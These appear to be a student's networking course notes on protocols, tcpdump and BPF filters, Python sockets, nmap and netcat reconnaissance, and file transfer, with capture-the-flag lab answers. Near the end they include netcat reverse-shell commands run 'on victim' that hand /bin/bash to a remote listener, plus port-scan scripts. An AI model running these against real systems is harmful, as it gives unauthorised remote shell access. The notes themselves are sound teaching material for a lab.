 ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/c437a114-923a-4066-8b24-58007ed901e6)

        RADIUS/Diameter (UDP 1645/1646 AND 1812/1813)
        Remote Authentication Dial-In User Service (RADIUS) is a open standard networking protocol used for centralized authentication, authorization, and accounting (AAA) services in network environments. It enables devices like network access servers (NAS), VPN gateways, and wireless access points to authenticate users and authorize their access to network resources.


## 3.4.15 Analyze Simple Network Management Protocol (SNMP)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/9482def2-0776-4d09-89fb-3f1af3d5da84)

        Versions:
       Version 1 & 2 are plaintext, version 3 is CT
       SNMPv1 - RFC 1157
       SNMPv2c - RFC 1441
       SNMPv3 - RFC 3410

## 3.4.16 Analyze Real-time Transport Protocol (RTP)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/2b694f87-656b-422f-bb57-2538c3bd4675)

      RTP (UDP any above 1023)

## 3.4.17 Analyze Remote Desktop Protocol (RDP)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/39c5d25c-63f0-468b-b8d1-876cc3bb53a3)

      RDP (TCP 3389)
      Developed by Microsoft (Open Standard)
      No server software needed
      Other Proprietary RDP software
      Requires to have 3rd pary software installed

## 3.4.18 Analyze Kerberos

     Secure network authentication protocol
     Clients obtain tickets to access services
     Mutual authentication
     Used by Active Directory

 ## 3.4.19 Analyze Lightweight Directory Access Protocol (LDAP)

     LDAP(S) (TCP 389 AND 636)
     Client/server model
     Hierarchical
     Directory schema
     Unsecure and secure versions
 
 
## DESCRIBE NETWORK TRAFFIC SNIFFING
https://net.cybbh.io/public/networking/latest/06_traffic_cap/fg.html

    Libpcap - https://www.tcpdump.org/
    WinPcap - https://www.winpcap.org/
    NPcap - https://nmap.org/npcap/

    Practical Uses:

    Network troubleshooting
    Diagnosing improper routing or switching
    Identifying port/protocol misconfigurations
    Monitor networking consumption
    Intercepting usernames and passwords
    Intercept and eavesdrop on network communications

    Disadvantages:

    Requires elevate permissions
    Can only capture what NIC can see
    Cannot capture local traffic
    Can consume massive amounts of system resources
    Lost packets on busy networks

    PACKETS CAN BE CAPTURED IN TWO WAYS:
    Hardware Packet Sniffers
    Software Packet Sniffers

    DESCRIBE SOCKET TYPES
    User Space Sockets
    Stream socket - TCP
    Datagram socket - UDP
    Kernel Space Sockets
    RAW Sockets -any socket where the kernel has to manipulate the NIC in any way

    CAPTURE LIBRARY
    Requires root for:
    Promicious Mode (Listen on all NICs)
    All captured packets are created as RAW Sockets

    Types of sniffing:
    **active** - Active sniffing involves actively injecting packets into the network to elicit responses from other devices. Unlike passive sniffing, active sniffing requires the sniffer to send packets to specific destinations and analyze the responses. Active sniffing can be more intrusive and may raise security concerns, but it can also provide more detailed insights into network behavior.
    **passive** - Passive sniffing involves monitoring network traffic without actively injecting or modifying packets. It typically uses network monitoring tools or packet capture software to capture packets as they traverse the network. Passive sniffing is often used for network troubleshooting, security monitoring, and performance analysis.

    



 ## EXPLAIN TCPDUMP PRIMITIVES
 https://net.cybbh.io/public/networking/latest/06_traffic_cap/fg.html

     User friendly capture expressions (if you use primitives with BPF's they might not work)

    src or dst
    host or net
    tcp or udp

    TCPDUMP PRIMITIVE QUALIFIERS
    type - the 'kind of thing' that the id name or number refers to
    host, net, port, or portrange
    dir - transfer direction to and/or from
    src or dst
    proto - restricts the match to a particular protocol(s)
    ether, arp, ip, ip6, icmp, tcp, or udp

    BASIC TCPDUMP OPTIONS
    -A = print payload in ASCII
    -D = list interfaces
    -i = specify capture interface
    -e = print data-link headers
    -X or XX = print payload in HEX and ASCII
          
     BASIC TCPDUMP OPTIONS
    -w = write to pcap
    -r = read from pcap
    -v, vv, or vvv = verbosity
    -n = no inverse lookups

     LOGICAL OPERATORS
    Primitives may be combined using:
    Concatenation: 'and' ( && )
    Alteration: 'or' ( || )
    Negation: 'not' ( ! )

    COMPARE PRIMITIVES AND BPFS
    Primitives (macros)
    
    CMU/Stanford Packet Filter (CSPF) Model commonly called Boolean Expression Tree
    Simple and easy filter expressions
    First user-level packet filter model
    Memory-stack-based filter machine which can create bottlenecks on model CPUs
    can have redundant computations of the same information

    Berkley Packet Filters (BPF)

    Control Flow Graph (CFG) Model
    Uses a simple (non-shared) buffer model which can make it 1.5 to 20 times faster than CSPF
    Can be more complex to create expressions but offer far more precision

## using TCP dump primitives

    sudo tcpdump -i eth0 (capture normally on eth0)
    sudo tcpdump -r BPFcheck.pcap (read from a pcap)
    sudo tcpdump -i eth0 -w practice.pcap (write the capture to a file)
    **primitive searches in TCP dump:**
      sudo tcpdump -r BPFCheck.pcap "ip src 10.10.10.24"
      sudo tcpdump -r BPFCheck.pcap -vn "udp portrange 1-1023"
      sudo tcpdump -r BPFCheck.pcap "udp portrange 1-1023 && ip src 10.0.2.15"
      sudo tcpdump -r BPFCheck.pcap "udp portrange 1-1023 and ! ip src 10.0.2.15"
      sudo tcpdump -r BPFCheck.pcap "udp portrange 1-1023 && (udp port 69 || tcp port 20)"

 ## Berkley Packet Filters (BPF's)

     TCPDUMP requests a RAW Socket creation
     Filters are set using the SO_ATTACH_FILTER
     SO_ATTACH_FILTER allows us to attach a Berkley Packet Filter to the socket to capture incoming packets.


     tcpdump '{A} [B:C] {D} {E} {F} {G}'

    A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
    B = Header Byte number
    C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
    D = optional: Bitwise mask (&)
    E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
    F = Result of Expression
    G = optional: Logical Operator (&& ||) to bridge expressions

 ## BPF EXAMPLES
    tcpdump -i eth0 'ether[12:2] = 0x0806'
    tcpdump -i eth1 'ip[9] = 0x06' (next protocol in ipv4 header TCP)
    tcpdump -i eth0 'tcp[0:2] = 53 || tcp[2:2] = 53' (listening on eth0, capture tcp traffic from byte offset 0-2 for DNS) 
    tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 || tcp[2:2] != 23)'
    tcpdump -i eth0 ether[12:2] = 0x0800 (ipv4)
    tcpdump -i eth0 ether[12:2] = 0x0806 (arp)
    tcpdump -i eth0 ether[12:2] = 0x8100 (VLan Tag)
    tcpdump -i eth0 ether[12:2] = 0x86dd (ipv6)

## Bitwise Masking

       BPFs can read 1 (byte), 2 (half-word) or 4 (word)
        BPFs alone will only filter to the byte level
        Bit-wise masking allow filtering precision to the bit level
        Binary (0) to ignore bit
        Binary (1) to match bit

        tcpdump 'ether[12:4] & 0xffff0fff = 0x81000abc'
        tcpdump 'ip[1] & 252 = 32'
        tcpdump 'ip[6] & 224 != 0'
        tcpdump 'tcp[13] 0x11 = 0x11'
        tcpdump 'tcp[12] & 0xf0 > 0x50'
        
## BPF Filter CTFD examples

    What is the Berkeley Packet Filter, using tcpdump, to capture all packets with a ttl of 64 and less, utilizing the IPv4 or IPv6 Headers? There should be 8508 packets.
    sudo tcpdump -r BPFCheck.pcap 'ip[8] <=64 || ip6[7] <=64'

    What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets with at least the Dont Fragment bit set? There should be 2321 packets.
     sudo tcpdump -r BPFCheck.pcap 'ip[6] & 64 = 64'

     What is the Berkeley Packet Filter, using tcpdump, to capture traffic with a Source Port higher than 1024, utilizing the correct Transport Layer Headers? There should be 7805 packets.
     sudo tcpdump -r BPFCheck.pcap 'tcp[0:2] > 1024 || udp[0:2] > 1024'

     What is the Berkeley Packet Filter, using tcpdump, to capture all Packets with UDP protocol being set, utilizing the IPv4 or IPv6 Headers? There should be 1277 packets.
     sudo tcpdump -r BPFCheck.pcap 'ip[9] = 0x11 || ip6[6] = 0x11'

     What is the Berkeley Packet Filter, using tcpdump, to capture only packets with the ACK/RST or ACK/FIN flag set, utilizing the correct Transport Layer Header? There should be 1201 packets.
     sudo tcpdump -r BPFCheck.pcap 'tcp[13] = 20 || tcp[13] = 17'

     What is the Berkeley Packet Filter, using tcpdump, to capture all packets with an IP ID field of 213? There should be 10 packets.
     sudo tcpdump -r BPFCheck.pcap 'ip[4:2] = 213'

     What is the Berkeley Packet Filter, using tcpdump, to capture all traffic that contains a VLAN tag? There should be 182 packets.
    sudo tcpdump -r BPFCheck.pcap 'ether[12:2] = 0x8100'

    What is the Berkeley Packet Filter, using tcpdump, to capture all packets relating to DNS? There should be 63 packets.
    sudo tcpdump -r BPFCheck.pcap 'tcp[0:2] = 53 || tcp[2:2] = 53 || udp[0:2] = 53 || udp[2:2] = 53'

    What is the Berkeley Packet Filter, using tcpdump, to capture the initial packets from a client trying to initiate a TCP connection? There should be 3447 packets
    sudo tcpdump -r BPFCheck.pcap 'tcp[13] = 2'

    What is the Berkeley Packet Filter, using tcpdump, to capture the response packets from a server listening on an open TCP ports? There should be 277 packets
    sudo tcpdump -r BPFCheck.pcap 'tcp[13] = 18'

    What is the Berkeley Packet Filter, using tcpdump, to capture the response packets from a server with closed TCP ports There should be 17 packets
    sudo tcpdump -r BPFCheck.pcap 'tcp[13] = 4'

    What is the Berkeley Packet Filter, using tcpdump, to capture all TCP and UDP packets sent to the well known ports? There should be 3678 packets
    sudo tcpdump -r BPFCheck.pcap 'tcp[2:2] <= 1023 || udp[2:2] <= 1023'

    What is the Berkeley Packet Filter, using tcpdump, to capture all HTTP traffic? There should be 1404 packets
    sudo tcpdump -r BPFCheck.pcap 'tcp[0:2] = 80 || tcp[2:2] = 80'

    What is the Berkeley Packet Filter, using tcpdump, to capture all telnet traffic? There should be 62 packets
    tcp[0:2] = 23 || tcp[2:2] = 23

     What is the Berkeley Packet Filter, using tcpdump, to capture all ARP traffic? There should be 40 packets
     sudo tcpdump -r BPFCheck.pcap 'ether[12:2] = 0x0806'

     What is the Berkeley Packet Filter, using tcpdump, to capture if the "Evil bit" is set? There should be 197 packets
     sudo tcpdump -r BPFCheck.pcap 'ip[6] & 0x80 = 0x80'

     What is the Berkeley Packet Filter, using tcpdump, to capture any packets containing the CHAOS protocol within an IPv4 header? There should be 139 packets
     sudo tcpdump -r BPFCheck.pcap 'ip[9] = 0x10'

     What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets with the DSCP field of 37? There should be 42 packets.
     sudo tcpdump -r BPFCheck.pcap 'ip[1] >> 2 =37'

     What is the Berkeley Packet Filter, using tcpdump, to capture all packets where the URG flag is not set and URG pointer has a value? There should be 43 packets
     sudo tcpdump -r BPFCheck.pcap 'tcp[13]& 32 = 0 && tcp[18:2] != 0'

     What is the Berkeley Packet Filter, using tcpdump, to capture a TCP null scan to the host 10.10.10.10? There should be 19 packets
     sudo tcpdump -r BPFCheck.pcap 'ip[16:4] = 0x0a0a0a0a && tcp[13] =0'

     What is the Berkeley Packet Filter, using tcpdump, to capture an attacker using vlan hopping to move from vlan 1 to vlan 10? There should be 15 packets
       sudo tcpdump -r BPFCheck.pcap 'ether[12:4]&0xffff0fff = 0x81000001 && ether[16:4] & 0xffff0fff=0x8100000a'

     What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets targeting just the beginning of potential traceroutes as it's entering your network. This can be from a Windows or Linux machine using their default settings? There should be 83 packets.
     sudo tcpdump -r BPFCheck.pcap 'ip[8] = 0x01 && (ip[9] = 0x11 || ip[9]=0x01)'
       

# Packet Creation and Socket Programming

    SOCKET TYPES
    Stream Sockets - Connection oriented and sequenced; methods for connection establishment and tear-down. Used with TCP, SCTP, and Bluetooth.
    Datagram Sockets - Connectionless; designed for quickly sending and receiving data. Used with UDP.
    Raw Sockets - Direct sending and receiving of IP packets without automatic protocol-specific formatting.

     User Space Sockets
      Stream Sockets
      Datagram Sockets

    Kernel Space Sockets
     Raw Sockets

     **User Space Sockets** - The most common sockets that do not require elevated privileges to perform actions on behalf of user applications.
     Using tcpdump or wireshark to read a file
     Using nmap with no switches
     Using netcat to connect to a listener
     Using netcat to create a listener above the well known port range (1024+)
     Using /dev/tcp or /dev/udp to transmit data

     **Kernel Space Sockets** - Attempts to access hardware directly on behalf of a user application to either prevent encapsulation/decapsulation or to create packets from scratch, which requires elevated privileges.
     Using tcpdump or wireshark to capture packets on the wire
    Using nmap for OS identification or to set specific flags when scanning
    Using netcat to create a listener in the well known port range (0 - 1023)
    Using Scapy to craft or modify a packet for transmission

## 12.4.1 Understanding Python Libraries

    Libraries (Standard Python Library)
     Modules (_import module)
     Functions (module.function)
     Exceptions (try:)
     Constants
     Objects ()
     List [] vs Tuple ()  

     my_string.upper()
     my_string.lower()
     my_string.split()
     my_list.append()
     my_list.insert()

     import {module}
     import {module} as {name}
     from {module} import *
     from {module} import {function}
     from {module} import {function} as {name}

     import socket
     s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)

     family: AF_INET (default), AF_INET6, AF_UNIX
     type: SOCK_STREAM (default), SOCK_DGRAM, SOCK_RAW
     proto: 0 (default), IPPROTO_TCP, IPPROTO_UDP, IPPROTO_IP, IPPROTO_ICMP, IPPROTO_RAW
     
## Python Examples

## Stream Socket

     #!/usr/bin/python3
     import socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
     ip_addr = '127.0.0.1'
     port = 1111
     s.connect((ip_addr, port))
     message = b"Message"
     s.send(message)
     data, conn = s.recvfrom(1024)
     print(data.decode('utf-8'))
     s.close()

     ** sudo tcpdump -i eth0 -XX -vn | nc -lvp 45678 **
## Datagram Socket

     #!/usr/bin/python3
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ipaddr = '127.0.0.1'
    port = 12345
    
    s.sendto(b'Python is the best!\n', (ipaddr,port))
    response, conn = s.recvfrom(1024)
    print(response.decode())

     ** sudo tcpdump -i eth0 -XX -vn | nc -luvp 12345 **

## ip RAW socket
     import socket
     import sys
     from struct import *
     
     try:
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
     except socket.error as msg:
             print(msg)
             sys.exit()
     
     packet = ''
     
     src_ip = "10.10.10.10"
     dest_ip = "20.20.20.20"
     
     ip_ver_ihl = 69
     ip_tos = 0
    ip_len = 0
    ip_id = 1775
    ip_frag = 0
    ip_ttl = 64
    ip_proto = 16
    ip_check = 0
    ip_srcadd = socket.inet_aton(src_ip)
    ip_dstadd = socket.inet_aton(dest_ip)

    ip_header = pack('!BBHHHBBH4s4s', ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)
    
    message = b'Almost made it to chow'
    packet = ip_header + message
    
    s.sendto(packet, (dest_ip, 0))

    ** sudo tcpdump -i eth0 -XX -vn "ip[4:2] = 1775" **

## TCP RAW client

     tcp_raw_client.py

     ** sudo tcpdump -i eth0 -XX -vn "ip[4:2] = 1918 **
     **sudo tcpdump -i eth0 -XX -vn "tcp[4:4] = 454" (or this one for the seq number)**

     
## encoding and decoding

     Encoding

    The process of taking bits and converting them using a specified cipher.

     Decoding
     
     Reverse of the conversion process used by the specified cipher for encoding.
     Common encoding schemes
     UTF-8, Base64, Hex

     xxd gives a hex dump of a string. ex: 
     echo "Wake up Marine" | xxd
     00000000: 5761 6b65 2075 7020 4d61 7269 6e65 0a    Wake up Marine.

     echo "FUBAR" | base64
     RlVCQVIK

     import base64
     message = b'Are you awake right now?'
     hidden_msg = base64.b64encode(message)
     s.send(hidden_msg)

      to decode that
      decoded_msg = base64.b64decode(hidden_msg)
       s.send(decoded_msg) **put all this at the end of the encoded msg**
      
      
  ## Service and Network discovery FG
https://net.cybbh.io/public/networking/latest/07_discovery/fg.html

       
     RECONNAISSANCE STAGES
       Passive External
       Active External
       Passive Internal
       Active Internal

       x-special/nautilus-clipboard
       copy
       file:///home/luke.a.mcghee55/Desktop/Screenshot%20from%202024-04-26%2008-35-02.png

       RECONNAISSANCE STEPS
          Network Footprinting
          Network Scanning
          Network Enumeration
          Vulnerability Assessment

          NETWORK ENUMERATION
           Network Resource and shares
           Users and Groups
           Routing tables
           Auditing and Service settings
           Machine names
           Applications and banners
           SNMP and DNS details
           Other common services and ports

         VULNERABILITY ASSESSMENT
          Injection
          Broken Authentication
          Sensitive Data Exposure
          XML External Entities
          Broken Access Control
          Security Misconfiguration
          Software/Components with Known Vulnerabilities
          DESCRIBE METHODS USED FOR PASSIVE EXTERNAL DISCOVERY
          recon1
          USEFUL SITES
          OSINT Framework
          Pentest-Standard
          SecuritySift
          DESCRIBE METHODS USED FOR ACTIVE EXTERNAL DISCOVERY
          recon2
          https://osintframework.com/

       PASSIVE RECON ACTIVITIES
        IP Addresses and Sub-domains
        Identifying External/3rd Party sites
        Identifying People
        Identifying Technologies
        Identifying Content of Interest
        Identifying Vulnerabilities

        IDENTIFYING CONTENT OF INTEREST
         /etc/passwd and /etc/shadow or SAM database
         Configuration files
         Log files
         Backup files
         Test pages
         Client-side code

     IDENTIFYING VULNERABILITIES
      Known Technologies
      Error messages responses
      Identify running services
      Identify running OS
      Monitor running Applications

      DIG VS WHOIS
       Whois - queries DNS registrar over TCP port 43
       Information about the owner who registered the domain
       Dig - queries DNS server over UDP port 53
       Name to IP records

      whois example:
        whois zonetransfer.me (look for name servers, phone numbers, emails etc.)

      Dig examples:
         dig zonetransfer.me A -> ipv4
         dig zonetransfer.me AAAA -> ipv6
         dig zonetransfer.me MX -> aspmx2.googlemail.com. (first dot would be an @ sign)
         dig zonetransfer.me TXT -> text record, made by people to give information for network admins
         dig zonetransfer.me NS -> name server
         dig zonetransfer.me SOA -> start of authority

         dig {website} {server} 

       Zone Transfer -> transfering info from one SOA to another via tcp 53
        dir axfr {@soa.server} {target-site}
        dig axfr @nsztm1.digi.ninja zonetransfer.me

       NetCraft -> similar to whois, but web-based. https://sitereport.netcraft.com

       PASSIVE OS FINGERPRINTER (P0F)
         Examine packets sent to/from target
         Can guess Operating Systems and version
         Can guess client/server application and version
       
        p0f: Passive scanning of network traffic and packet captures.

         more /etc/p0f/p0f.fp
         sudo p0f -i eth0
         sudo p0f -r test.pcap

        SCANNING NATURE
        Active -> reaching out and touching the box
        Passive -> capturing traffic

        SCANNING STRATEGY (local is the network, remote is outside the primary network)
         Remote to Local
         local to Remote
         local to Local
         Remote to Remote

         SCANNING APPROACH
         Aim
          Wide range target scan
          Target specific scan

          Method
            Single source scan
              1-to-1 or 1-to-many

           Distributed scan
             many-to-one or many-to-many

         NETWORK SERVICE DISCOVERY -> nmap scans
             Broadcast Ping/Ping sweep (-sP, -PE)
             **SYN scan (-sS)**
             **Full connect scan (-sT)**
             Null scan (-sN)
             FIN scan (-sF)
             XMAS tree scan (-sX)
             **UDP scan (-sU)**
             **Idle scan (-sI)** (zombie, using another box to scan another box)
             ACK/Window scan (-sA)
            RPC scan (-sR)
            FTP scan (-b)
            Decoy scan (-D)
            **OS fingerprinting scan (-O)**
            **Version scan (-sV)**
            Protocol ping (-PO)
            Discovery probes (-PE, -PP, -PM)
            -PE - ICMP Ping
            **-Pn - No Ping** (pretty much always use -Pn)

           NMAP - TIME-OUT
            -T0 - Paranoid - 300 Sec
            -T1 - Sneaky - 15 Sec
            -T2 - Polite - 1 Sec
            -T3 - Normal - 1 Sec
            **-T4 - Aggresive - 500 ms** using this one in this course
            -T5 - Insane - 250 ms

       TRACEROUTE - FIREWALKING (probs won't use it much in here)
       traceroute 172.16.82.106
       traceroute 172.16.82.106 -p 123
       sudo traceroute 172.16.82.106 -I
       sudo traceroute 172.16.82.106 -T
       sudo traceroute 172.16.82.106 -T -p 443

       NETCAT - SCANNING (like nmap but faster, nmap is a little easier to view)
       nc [Options] [Target IP] [Target Port(s)]
       -z : Port scanning mode i.e. zero I/O mode
       -v : Be verbose [use twice -vv to be more verbose]
       -n : do not resolve ip addresses
       -w1 : Set time out value to 1
       -u : To switch to UDP

       nc -zvn -w1 172.16.82.106 21-23 (if you expect a port to be open and it doesn't show, your box cannot see it)
       [172.16.82.106] 23 (telnet) open
       [172.16.82.106] 22 (ssh) open
       [172.16.82.106] 21 (ftp) open

       NETCAT - TCP SCAN SCRIPT (ports to check! 21-23 80)
       #!/bin/bash
       echo "Enter network address (e.g. 192.168.0): "
       read net
       echo "Enter starting host range (e.g. 1): "
       read start
       echo "Enter ending host range (e.g. 254): "
       read end
       echo "Enter ports space-delimited (e.g. 21-23 80): "
       read ports
       for ((i=$start; $i<=$end; i++))
       do
           nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
       done

       NETCAT - UDP SCAN SCRIPT
       #!/bin/bash
       echo "Enter network address (e.g. 192.168.0): "
       read net
       echo "Enter starting host range (e.g. 1): "
       read start
       echo "Enter ending host range (e.g. 254): "
       read end
       echo "Enter ports space-delimited (e.g. 21-23 80): "
       read ports
       for ((i=$start; $i<=$end; i++))
       do
           nc -nuvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
       done

       NETCAT - BANNER GRABBING
       Find what is running on a particular port(-u for udp)
       nc [Target IP] [Target Port]
       nc 172.16.82.106 22
       ex:
         nc 172.16.82.106 21
            220 ProFTPD Server (Debian) [::ffff:172.16.82.106]
      9999 - maybe an alternate ssh port? 
      maybe there's a message on a port.

      CURL AND WGET
    Both can be used to interact with the HTTP, HTTPS and FTP protocols. (pulls back information hosted on server)
    Curl - Displays ASCII
    curl http://172.16.82.106
    curl ftp://172.16.82.106

    Wget - Downloads (-r recursive) **downloads file from webserver**
    wget -r http://172.16.82.106
    wget -r ftp://172.16.82.106
    wget -r http://172.16.82.106:8888 (write http/port if not using native http port)
    then cat the file saved.
    or
    firefox 172.16.82.106/index.html (to view it in browser)

    **do this if file is somewhere other than root dir**
    ftp 172.16.82.106
    login
    ftp > ls
    cd ..
    ls
    **go into passive mode**
    ftp > get passwd (to pull back files in ftp passive mode)

    **Packet sniffers** **look for credentials on the network / "sending traffic to this box" / advertising a network ** (cannot use wireshark or tcpdump through a tunnel)
    wireshark
    tcpdump

    **NATIVE HOST TOOLS**
    Show TCP/IP network configuration
    Windows: ipconfig /all
    Linux: ip address (ifconfig depreciated)
    VyOS: show interface

    **NATIVE HOST TOOLS**
    Show DNS configuration
    Windows: ipconfig /displaydns
    Linux: cat /etc/resolv.conf

    **Show ARP Cache**
    Windows: arp -a
    Linux: ip neighbor (arp -a depreciated)

    **Show network connections**
    Windows: netstat
    Linux: ss (netstat depreciated)
    
    Example options useful for both netstat and ss: -antp
    a = Displays all active connections and ports.
    n = No determination of protocol names. Shows 22 not SSH.
    t = Display only TCP connections.
    u = Display only UDP connections.
    p = Shows which processes are using which sockets.

    **Services File**
    Windows: %SystemRoot%\system32\drivers\etc\services
    Linux/Unix: /etc/services

    **OS Information**
    Windows: systeminfo
    Linux: uname -a and /etc/os-release

    **Show Running Processes**
    Windows: tasklist
    Linux: ps or top
    
    Example options useful for ps: -elf
    e = Show all running processes
    l = Show long format view
    f = Show full format listing

    Command path -> run which command for all the programs you're trying to use(might have to sudo which)
    which
    whereis

    **Routing Table**
    Windows: route print
    Linux: ip route (netstat -r deprecated)
    VyOS: show ip route

    **File search**
    find / -name hint* 2> /dev/null
    find / -iname flag* 2> /dev/null (do this for everything)

    ACTIVE INTERNAL DISCOVERY

    Ping scanning
    for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
    then
    nmap -Pn -T4 172.16.82.106,112,110,113,114,115,126 -p 21-23,80

    NETWORK FORENSICS - MAPPING
     Device type (Router/host)
     System Host-names
     Interface names (eth0, eth1, etc)
     IP address and CIDRs for all interfaces
     TCP and UDP ports
     MAC Address
     OS type/version
     Known credentials

 ## demo
     1. ip a (find your interfaces)
       draw your IH box, write your interface and ip.
     2. given an ip for a next hop -> draw next hop and ip
       nmap scan( nmap -Pn -T4 10.10.205.253 -p 21-23 80)
     4. banner grab port to make sure it aligns with port (nc 10.10.205.253 22)
     5. write open port/s & creds.
     6. if 22/23 -> connect and start enumeration
     7. if 21 or 80, wget 
    8. get on the box -> ssh student@10.10.205.253 -> if vyos, l: vyos p: passowrd
    9. ss -ntlp
    10. ip neigh (if stale, still a possibility)

    Internal recon methodology
     italicized/bolded words are commands

     _hostname_
     permissions: sudo -l
     

## File Transfer and redirection
https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html

    DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
    TFTP
    FTP
      Active
      Passive
    FTPS
    SFTP
    SCP

    **TFTP**
     Trivial File Transfer Protocol
     RFC 1350 Rev2
     UDP transport
     Extremely small and very simple communication
     No terminal communication
     Insecure (no authentication or encryption)
     No directory services
     Used often for technologies such as BOOTP and PXE
    
     FTP
    **File Transfer Protocol**
       RFC 959
       Uses 2 separate TCP connections
       Control Connection (21) / Data Connection (20*)
       Authentication in clear-text
       Insecure in default configuration
       Has directory services
       Anonymous login
    **FTPS**
     File Transfer Protocol Secure
     TCP transport
     Adds SSL/TLS encryption to FTP
     Authentication with username/password or PKI
     Interactive terminal access
     SFTP
      Secure File Transfer Protocol
      TCP transport (port 22)
      Uses symmetric and asymmetric encryption
      Adds FTP like services to SSH
      Authentication through sign in (username and password) or with SSH key
      Interactive terminal access

   ## SCP
     Secure Copy Protocol
     TCP Transport (port 22)
     Uses symmetric and asymmetric encryption
     Authentication through sign in (username and password) or with SSH key
     Non-Interactive

     **scp examples:**
     Download a file from a remote directory to a local directory
     scp student@172.16.82.106:secretstuff.txt /home/student

     Upload a file to a remote directory from a local directory
     scp secretstuff.txt student@172.16.82.106:/home/student

     Copy a file from a remote host to a separate remote host
     scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student

    **SCP SYNTAX W/ ALTERNATE SSHD**
     Download a file from a remote directory to a local directory
     scp -P 1111 student@172.16.82.106:secretstuff.txt .

     Upload a file to a remote directory from a local directory
     scp -P 1111 secretstuff.txt student@172.16.82.106:

     **SCP SYNTAX THROUGH A TUNNEL**
     Create a local port forward to target device
     ssh student@172.16.82.106 -L 1111:localhost:22 -NT

     Download a file from a remote directory to a local directory
     scp -P 1111 student@localhost:secretstuff.txt /home/student

     **Upload a file to a remote directory from a local directory**
     scp -P 1111 secretstuff.txt student@localhost:/home/student

     **SCP SYNTAX THROUGH A DYNAMIC PORT FORWARD**
     Create a Dynamic Port Forward to target device
     ssh student@172.16.82.106 -D 9050 -NT

     Download a file from a remote directory to a local directory
     proxychains scp student@localhost:secretstuff.txt .

     Upload a file to a remote directory from a local directory
     proxychains scp secretstuff.txt student@localhost:

     
  ## NETCAT
      
    NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.
    Can be used for the following:
        inbound and outbound connections, TCP/UDP, to or from any port
        troubleshooting network connections
        sending/receiving data (insecurely)
        port scanning (similar to -sT in Nmap)
        examples:
        **CLIENT TO LISTENER FILE TRANSFER**
        Listener (receive file):
        nc -lvp 9001 > newfile.txt

        Client (sends file):
        nc 172.16.82.106 9001 < file.txt

        **LISTENER TO CLIENT FILE TRANSFER**
        Listener (sends file):
        nc -lvp 9001 < file.txt

        Client (receive file):
        nc 172.16.82.106 9001 > newfile.txt

        **NETCAT RELAY DEMOS**
        Listener - Listener
        On Blue_Host-1 Relay:
        mknod mypipe p
        nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe

        On Internet_Host (send):
        nc 172.16.82.106 1111 < secret.txt

        On Blue_Priv_Host-1 (receive):
        nc 192.168.1.1 3333 > newsecret.txt

        **Client - Client**
        On Internet_Host (send):
        nc -lvp 1111 < secret.txt

        On Blue_Priv_Host-1 (receive):
        nc -lvp 3333 > newsecret.txt

        On Blue_Host-1 Relay:
        mknod mypipe p
        nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

        "file" command to find file types.

        **REVERSE SHELL USING NETCAT**
        First listen for the shell on your device.
        nc -lvp 9999

        On Victim using -c :
        nc -c /bin/bash 10.10.0.40 9999

        On Victim using -e :
        nc -e /bin/bash 10.10.0.40 9999

  ## XXD EXAMPLE
        echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\
        echo "Hex encoding test" | xxd -p
        48657820656e636f64696e6720746573740a

        echo hex string and use xxd to restore the data to its original format
        echo "48657820656e636f64696e6720746573740a" | xxd -r -p
        Hex encoding test

        ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/ffef630c-b2fd-4c84-a72f-b264a0c24d0c)
        ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/587c45aa-1fe2-4d81-a8ee-d4381c527bad)

        **TRANSFER FILE WITH BASE64**
        generate the base64 output of a file, with line wrapping removed
        base64 -w0 logoCyber.png

        TRANSFER FILE WITH BASE64

        create a new file on your machine
        nano b64image.png

        decode from base64 with -d
        base64 -d b64image.png > logoCyber.png

        turn stuff into hex or base64
        echo "answer" | md5sum
        echo "answer" | base64
        echo "answer" | xxd

        CTFD's

        Utilize the targets T2 and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:

       Syntax for steghide tool:
       steghide extract -sf [image name]
       Passphrase: password
       
       The Donovian Insider provided a image called 1steg.jpg on T2 and is trying to connect to RELAY on TCP port 1234 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Once the images are downloaded you will use a command-line tool called steghide to extract the message. Perform an MD5SUM on this message to create flag1.
       
       File should be 89824 bytes in size.

               on relay: 
                nc -lvp 1234 < mypipe | nc 10.10.0.40 1111 > mypipe
               on T1:
                nc -lvp 1111 > test.txt



     Utilize the targets T2 and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:

     Syntax for steghide tool:
     steghide extract -sf [image name]
     Passphrase: password
     
     The Donovian Insider provided a image called 4steg.jpg on T2 listening for a connection from RELAY on TCP port 9876. Establish a Netcat relay on RELAY to make this connection and forward to T1. Once the images are downloaded you will use a command-line tool called steghide to extract the message. Perform an MD5SUM on this message to create flag4.
     
     File should be 204283 bytes in size.


     on relay: 
